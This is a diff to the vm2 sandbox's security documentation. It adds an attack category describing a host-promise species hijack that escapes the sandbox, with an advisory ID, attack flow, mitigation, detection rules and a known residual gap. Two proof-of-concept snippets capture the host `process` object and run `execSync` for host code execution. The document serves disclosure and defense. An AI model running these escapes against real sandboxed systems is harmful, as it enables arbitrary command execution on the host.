@@ -4,7 +4,7 @@ Deferred execution as a way to run sandbox code against unsanitized values: Prom
 
 Defense invariants enforced by fixes in this family: 4, 12, 14 (see [Defense Invariants](../ATTACKS.md#defense-invariants)).
 
-Categories in this file: [7](promise-async.md#attack-category-7-promise-and-async-exploitation), [19](promise-async.md#attack-category-19-host-preparestacktrace-fallback-via-arrayfromasync-promise-bypass), [29](promise-async.md#attack-category-29-async-generator-yield-return-thenable-exception-capture), [31](promise-async.md#attack-category-31-promise-species-hijack-in-localpromise-swallow-tail), [33](promise-async.md#attack-category-33-webassembly-jspi-cross-realm-promise-prototype), [43](promise-async.md#attack-category-43-stale-promisethenlookupchain-protector--species-survives-finally), [51](promise-async.md#attack-category-51-allowasync-false-bypass-via-promise-thenable-assimilation).
+Categories in this file: [7](promise-async.md#attack-category-7-promise-and-async-exploitation), [19](promise-async.md#attack-category-19-host-preparestacktrace-fallback-via-arrayfromasync-promise-bypass), [29](promise-async.md#attack-category-29-async-generator-yield-return-thenable-exception-capture), [31](promise-async.md#attack-category-31-promise-species-hijack-in-localpromise-swallow-tail), [33](promise-async.md#attack-category-33-webassembly-jspi-cross-realm-promise-prototype), [43](promise-async.md#attack-category-43-stale-promisethenlookupchain-protector--species-survives-finally), [51](promise-async.md#attack-category-51-allowasync-false-bypass-via-promise-thenable-assimilation), [53](promise-async.md#attack-category-53-host-promise-species-hijack--missing-handler-delivers-the-raw-settlement-to-the-sandbox).
 
 ---
 
@@ -761,3 +761,75 @@ Restores **[Defense Invariant #14](../ATTACKS.md#defense-invariants)**. Structur
 - **`.catch` / `.finally`** under `allowAsync: false` — route through the blocked `.then` and therefore throw. No separate handling needed.
 - **`queueMicrotask` / `setTimeout` / `setImmediate`** — not exposed in the sandbox global under `allowAsync: false`, so they are not alternative scheduling vectors.
 - **WebAssembly JSPI / `WebAssembly.Suspending`** — produce cross-realm promises and are neutralized separately at bootstrap ([Category 33](promise-async.md#attack-category-33-webassembly-jspi-cross-realm-promise-prototype)); not an `allowAsync` scheduling vector once removed.
+
+---
+
+## Attack Category 53: Host-Promise `@@species` Hijack + Missing Handler Delivers the Raw Settlement to the Sandbox
+
+**Advisories**: GHSA-6454-5x88-m6jw
+
+**Tests**: test/ghsa/GHSA-6454-5x88-m6jw/
+
+**Uses**: [Category 7](promise-async.md#attack-category-7-promise-and-async-exploitation) (the Promise-species primitive), [Category 43](promise-async.md#attack-category-43-stale-promisethenlookupchain-protector--species-survives-finally)
+
+**Supersedes**: closes the **host-realm** counterpart of the sandbox-side Promise-species defenses ([Category 43](promise-async.md#attack-category-43-stale-promisethenlookupchain-protector--species-survives-finally), which hardened only the sandbox `Promise.prototype`) and the **missing-handler** gap left by the callback-slot wrapping of [Category 39](error-sanitization.md#attack-category-39-host-promise-rejection-sanitizer-bypass-via-callapply-indirection) and [Category 38](error-sanitization.md#attack-category-38-errorcause-host-reference-leak-to-sandbox).
+
+### Description
+
+When an embedder exposes a host API that returns a host-realm `Promise`, sandbox code can call `.then` / `.catch` / `.finally` on it across the bridge. vm2 sanitizes the *callback values* by routing the callback slots the sandbox supplies through the Category 38/39 rebuild. But V8 builds the `.then` result capability via `SpeciesConstructor(hostPromise, %Promise%)`, which reads `hostPromise.constructor[Symbol.species]` **directly off the raw host promise** — bypassing every bridge trap. The Category 43 neutralization freezes only the *sandbox* `Promise.prototype`; a *host* promise's `constructor` is an ordinary writable property from the sandbox's view.
+
+So the sandbox writes `hostPromise.constructor = Evil`, where `Evil` is a sandbox constructor whose executor captures V8's `(resolve, reject)`. If the sandbox then **omits the handler** for the settlement direction — `p.then()` with no `onRejected`, or `p.then(onF)` / `p.catch()` / `p.finally()` — V8 substitutes its internal **Thrower** (reject) or **Identity** (fulfill) reaction, which delivers the *raw* host settlement value to the attacker-captured capability with **no callback slot for vm2 to wrap**. A host rejection/fulfillment carrying `process` (directly or on a property) reaches sandbox code as a live bridge proxy → `reason.mainModule.require('child_process').execSync(...)` → host RCE.
+
+`.catch()` and `.finally()` are strictly worse than `.then()`: their missing reactions are synthesized *inside* the V8 builtin, off the apply-trap path entirely, so any defense that injects into the supplied argument slots cannot reach them.
+
+### Attack Flow
+
+1. Embedder exposes a host callable returning a host promise: `hostReject: () => Promise.reject(process)`.
+2. Sandbox hijacks the species channel on the raw host promise: `p.constructor = { [Symbol.species]: function (ex) { ex(function(){}, captureReject); } }`.
+3. Sandbox calls `p.then()` with the settlement-direction handler omitted.
+4. `SpeciesConstructor` invokes the sandbox executor (capturing `reject`); the internal Thrower delivers the raw host `process` to `captureReject`.
+5. `proc.mainModule.require('child_process').execSync('id')` → host command execution.
+
+### Canonical Examples
+
+```js
+const {VM} = require('vm2');
+new VM({sandbox:{hostReject: () => Promise.reject(process)}}).run(`
+  const p = hostReject();
+  p.constructor = { [Symbol.species]: function (ex) { ex(function(){}, function (proc) {
+    proc.mainModule.require('child_process').execSync('id');   // host RCE
+  }); } };
+  p.then();                                                    // missing onRejected
+`);
+```
+
+```js
+// Indirection variant: host Reflect.apply invokes the host then with a sandbox-chosen
+// receiver, so a peel that only recognizes Function.prototype.call/apply never sees
+// the promise method and neither the species neutralization nor the callback
+// wrapping fires.
+new VM({sandbox:{hostReject: () => Promise.reject(process), hostReflect: Reflect}}).run(`
+  const p = hostReject();
+  p.constructor = { [Symbol.species]: Evil };   // as above
+  hostReflect.apply(p.then, p, []);             // also: Reflect.apply(then.call, then, [p])
+`);
+```
+
+### Why It Works
+
+`SpeciesConstructor` reads `constructor` / `@@species` off the raw host promise before any reaction runs, and the bridge never mediated that read. The slot-wrapping defense only sanitizes *present* callbacks; a missing handler has no slot, and V8's Thrower/Identity fills it with the raw settlement value.
+
+### Mitigation
+
+Neutralize the species channel at the **capability-construction** chokepoint, not the value-delivery one. Across a sandbox→host `then`/`catch`/`finally` call, `lib/bridge.js` (`neutralizeHostPromiseSpeciesOn`) shadows the raw host promise's own `constructor` with an inert `undefined` data property for the duration of the call, so `SpeciesConstructor` resolves to the realm-correct host `%Promise%`; the result capability is a genuine host promise the sandbox can never capture. The raw settlement then flows into a host promise, observable by the sandbox only by attaching a fresh `.then`/`.catch` — which re-enters the trap and *is* sanitized by the Category 38 rebuild. The original `constructor` is restored in the existing `finally` (deleted when there was no own descriptor). The peel (`peelEffectivePromiseCall`) resolves `.call`/`.apply`/`Reflect.apply` indirection and recognizes `.finally`, returning the effective receiver so direct, indirected, and finally shapes are all covered. (`.bind` needs no peel branch: the bridge unwraps a host bound function so the apply trap already sees the target `then`/`catch`/`finally` as `object`.) The peel MUST recognize *every* host callable that can invoke a host promise method with a sandbox-chosen receiver — the neutralization and the callback wrapping both gate on it, so any un-peeled invoker (e.g. host `Reflect.apply`, reachable whenever the embedder exposes host `Reflect`) re-opens both the missing-handler species escape and the callback-slot bypass. Fails closed with `VMError` on a non-configurable `constructor` or a non-extensible host promise (neither can be safely shadowed). Present handlers still route through the Category 38 rebuild unchanged — no over-block. Mirrors `neutralizeArraySpeciesOn` ([Category 18](host-reference-primitives.md#attack-category-18-array-species-self-return-via-constructor-manipulation)) and the sandbox-side `resetPromiseSpecies` ([Category 43](promise-async.md#attack-category-43-stale-promisethenlookupchain-protector--species-survives-finally)). Restores **[Defense Invariant #4](../ATTACKS.md#defense-invariants)** (V8 internal algorithms must see neutralized species on raw objects) and **[#12](../ATTACKS.md#defense-invariants)** for every host-promise method call the sandbox initiates.
+
+### Detection Rules
+
+- Sandbox source assigning `constructor` or a `[Symbol.species]` onto a host-realm object obtained from an embedder API — especially a Promise.
+- A host `.then` / `.catch` / `.finally` invoked from the sandbox with the settlement-direction handler omitted after a `constructor` / species write.
+- Any defense that sanitizes Promise *callback values* but not the *result-capability constructor*: the missing-handler path has no callback to sanitize.
+- Sandbox invoking a host `.then`/`.catch`/`.finally` through an indirection primitive the promise peel does not recognize — `Reflect.apply(p.then, p, [])`, `Reflect.apply(then.call, then, [p])` — after a species write. Any host callable that forwards to another callable with a chosen `this` is an indirection primitive here.
+
+### Known Residual
+
+The neutralization is scoped to the sandbox→host call: the sandbox's `p.constructor = Evil` write itself still lands on the raw host promise (the bridge `set` trap permits ordinary writes onto a non-frozen host object), and it is shadowed only while a sandbox-initiated `then`/`catch`/`finally` is in flight. This becomes a bug when **host-realm code** later calls `.then()` / `.catch()` / `.finally()` (or `Reflect.apply(p.then, p, …)`) on that same poisoned promise with the settlement-direction handler omitted: `SpeciesConstructor` then runs entirely host-side, invokes the sandbox `Evil` executor, and the raw settlement reaches the captured capability. A plain `await p` in host code is unaffected (`await` does not consult `SpeciesConstructor`). Embedder helpers that forward a sandbox-touched promise through their own `.then` are the exposed shape; closing it structurally means refusing `constructor` / `[Symbol.species]` writes on host promises at the `set` / `defineProperty` traps, mirroring the sandbox-side freeze of Category 43.
